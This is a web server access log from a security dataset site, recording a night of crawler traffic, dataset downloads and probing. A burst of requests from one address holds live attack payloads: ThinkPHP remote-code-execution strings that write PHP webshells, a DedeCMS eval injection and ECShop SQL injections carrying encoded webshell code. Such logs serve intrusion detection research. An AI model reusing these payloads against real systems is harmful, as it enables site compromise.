54.36.150.175 - - [21/Mar/2019:02:12:01 -0700] "GET /self.logs/2015/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [21/Mar/2019:20:13:40 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
103.131.71.141 - - [21/Mar/2019:20:14:11 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.141 - - [21/Mar/2019:20:14:13 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.137 - - [21/Mar/2019:20:14:15 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.141 - - [21/Mar/2019:20:14:28 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.143 - - [21/Mar/2019:20:14:30 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
207.46.13.104 - - [21/Mar/2019:20:17:12 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.42 - - [21/Mar/2019:20:17:45 -0700] "GET /self.logs/2015/access.log.2015-10-21.gz HTTP/1.1" 200 7853 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.175 - - [21/Mar/2019:20:22:34 -0700] "GET /self.logs/access.log.2017-02-06.gz HTTP/1.1" 200 29943 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.80 - - [21/Mar/2019:20:23:45 -0700] "GET /self.logs/error.log.2017-05-30.gz HTTP/1.1" 200 842 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
95.216.124.141 - - [21/Mar/2019:20:26:50 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3432.3 Safari/537.36" 
207.46.13.104 - - [21/Mar/2019:20:28:25 -0700] "GET /self.logs/access.log.2017-09-02.gz HTTP/1.1" 200 16427 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.117 - - [21/Mar/2019:20:35:29 -0700] "GET /self.logs/access.log.2017-05-24.gz HTTP/1.1" 200 55977 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
59.64.129.186 - - [21/Mar/2019:20:40:26 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [21/Mar/2019:20:40:27 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [21/Mar/2019:20:40:27 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [21/Mar/2019:20:40:31 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [21/Mar/2019:20:40:46 -0700] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 1531 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.186 - - [21/Mar/2019:20:40:47 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/smtp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
202.158.96.204 - - [21/Mar/2019:20:45:57 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
202.158.96.204 - - [21/Mar/2019:20:45:57 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.116.104.159 - - [21/Mar/2019:20:47:43 -0700] "GET /self.logs/ HTTP/1.1" 200 15472 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
223.72.63.48 - - [21/Mar/2019:20:47:52 -0700] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
59.64.129.82 - - [21/Mar/2019:20:47:53 -0700] "HEAD /maccdc2012/smtp.log.gz HTTP/1.1" 200 239 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 (ICE), Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
54.36.150.4 - - [21/Mar/2019:20:48:50 -0700] "GET /self.logs/2016/access.log.2016-08-21.gz HTTP/1.1" 200 7775 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.175 - - [21/Mar/2019:20:54:48 -0700] "GET /self.logs/access.log.2019-01-19.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.201 - - [21/Mar/2019:20:58:55 -0700] "GET /self.logs/access.log.2015-05-10.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
23.228.81.10 - - [21/Mar/2019:20:59:01 -0700] "GET /wp-content/themes/brainstorm/style.css HTTP/1.1" 404 303 "http://www.secrepo.com/wp-content/themes/brainstorm/style.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36" 
54.36.150.164 - - [21/Mar/2019:20:59:17 -0700] "GET /self.logs/access.log.2016-05-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
100.27.37.89 - - [21/Mar/2019:21:04:31 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
100.27.37.89 - - [21/Mar/2019:21:04:31 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
95.163.255.197 - - [21/Mar/2019:21:09:40 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.196 - - [21/Mar/2019:21:09:42 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 17551 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
209.242.219.67 - - [21/Mar/2019:21:12:57 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3432.3 Safari/537.36" 
34.209.182.200 - - [21/Mar/2019:21:13:13 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
34.209.182.200 - - [21/Mar/2019:21:13:14 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
34.209.182.200 - - [21/Mar/2019:21:13:14 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
54.36.148.214 - - [21/Mar/2019:21:13:29 -0700] "GET /self.logs/access.log.2017-10-04.gz HTTP/1.1" 200 32485 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.36 - - [21/Mar/2019:21:13:36 -0700] "GET /self.logs/access.log.2016-02-15.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
101.50.91.19 - - [21/Mar/2019:21:14:38 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
101.50.91.19 - - [21/Mar/2019:21:14:38 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.233 - - [21/Mar/2019:21:22:18 -0700] "GET /self.logs/access.log.2015-08-02.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [21/Mar/2019:21:24:31 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.28 - - [21/Mar/2019:21:26:14 -0700] "GET /self.logs/2015/error.log.2015-05-23.gz HTTP/1.1" 200 728 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.124 - - [21/Mar/2019:21:27:45 -0700] "GET /self.logs/access.log.2017-05-23.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
168.126.149.10 - - [21/Mar/2019:21:31:48 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:48 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:49 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:49 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:49 -0700] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:49 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:49 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:50 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:50 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:50 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:50 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:50 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:51 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=pqjqh.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=pqjqh.php&content=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:51 -0700] "GET /pqjqh.php HTTP/1.1" 404 294 "http://www.secrepo.com/pqjqh.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:51 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:52 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:52 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=sjrco.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=sjrco.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
168.126.149.10 - - [21/Mar/2019:21:31:52 -0700] "GET /sjrco.php HTTP/1.1" 404 294 "http://www.secrepo.com/sjrco.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
54.159.171.64 - - [21/Mar/2019:21:36:29 -0700] "GET /favicon.ico HTTP/1.1" 301 464 "-" "PocketImageCache/1.0" 
54.159.171.64 - - [21/Mar/2019:21:36:29 -0700] "GET /favicon.ico HTTP/1.1" 200 231 "-" "PocketImageCache/1.0" 
41.223.160.131 - - [21/Mar/2019:21:36:41 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.41 - - [21/Mar/2019:21:37:27 -0700] "GET /self.logs/access.log.2017-02-19.gz HTTP/1.1" 200 16441 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.129 - - [21/Mar/2019:21:41:51 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [21/Mar/2019:21:41:56 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.149.47 - - [21/Mar/2019:21:45:29 -0700] "GET /self.logs/error.log.2016-01-18.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
117.136.44.171 - - [21/Mar/2019:21:47:26 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Dalvik/2.1.0 (Linux; U; Android 9; EML-AL00 Build/HUAWEIEML-AL00)" 
117.136.44.171 - - [21/Mar/2019:21:47:33 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Dalvik/2.1.0 (Linux; U; Android 9; EML-AL00 Build/HUAWEIEML-AL00)" 
199.58.86.206 - - [21/Mar/2019:21:48:39 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [21/Mar/2019:21:48:40 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [21/Mar/2019:21:48:42 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [21/Mar/2019:21:48:44 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.150.107 - - [21/Mar/2019:21:50:46 -0700] "GET /self.logs/2015/error.log.2015-02-22.gz HTTP/1.1" 200 4348 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.92.101.30 - - [21/Mar/2019:21:51:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.92.101.30 - - [21/Mar/2019:21:51:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.92.101.30 - - [21/Mar/2019:21:51:08 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.92.101.30 - - [21/Mar/2019:21:51:09 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.148.193 - - [21/Mar/2019:21:55:18 -0700] "GET /self.logs/2016/error.log.2016-04-09.gz HTTP/1.1" 200 738 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
128.177.10.252 - - [21/Mar/2019:21:58:00 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)" 
54.36.148.130 - - [21/Mar/2019:22:00:55 -0700] "GET /self.logs/access.log.2015-01-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
39.104.204.75 - - [21/Mar/2019:22:02:09 -0700] "POST /old/wp-content/themes/AdvanceImage5/functions.php HTTP/1.1" 404 303 "-" "-" 
54.36.150.71 - - [21/Mar/2019:22:02:18 -0700] "GET /self.logs/2015/error.log.2015-12-27.gz HTTP/1.1" 200 579 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [21/Mar/2019:22:04:59 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.180 - - [21/Mar/2019:22:06:55 -0700] "GET /self.logs/2015/access.log.2015-10-15.gz HTTP/1.1" 200 9950 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
61.150.43.52 - - [21/Mar/2019:22:12:09 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
118.136.54.78 - - [21/Mar/2019:22:14:03 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
40.77.167.87 - - [21/Mar/2019:22:14:47 -0700] "GET /self.logs/access.log.2016-11-23.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.129 - - [21/Mar/2019:22:15:01 -0700] "GET /self.logs/error.log.2017-09-24.gz HTTP/1.1" 200 1963 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
118.116.104.159 - - [21/Mar/2019:22:15:45 -0700] "GET /self.logs/ HTTP/1.1" 200 15472 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
54.36.150.32 - - [21/Mar/2019:22:15:50 -0700] "GET /self.logs/access.log.2016-06-23.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.100 - - [21/Mar/2019:22:17:46 -0700] "GET /self.logs/error.log.2019-02-02.gz HTTP/1.1" 200 2801 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.67 - - [21/Mar/2019:22:18:48 -0700] "GET /self.logs/error.log.2015-09-02.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
118.116.104.159 - - [21/Mar/2019:22:29:22 -0700] "GET /self.logs/access.log.2018-03-29.gz HTTP/1.1" 200 21086 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
113.171.224.176 - - [21/Mar/2019:22:31:06 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.187 - - [21/Mar/2019:22:40:48 -0700] "GET /self.logs/access.log.2017-08-25.gz HTTP/1.1" 200 17991 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
109.201.154.240 - - [21/Mar/2019:22:43:33 -0700] "HEAD / HTTP/1.1" 301 209 "https://uptime.com/secrepo.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
54.36.148.52 - - [21/Mar/2019:22:44:33 -0700] "GET /self.logs/2016/error.log.2016-10-31.gz HTTP/1.1" 200 1013 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
166.111.68.22 - - [21/Mar/2019:22:46:26 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:46:26 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:46:26 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:46:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
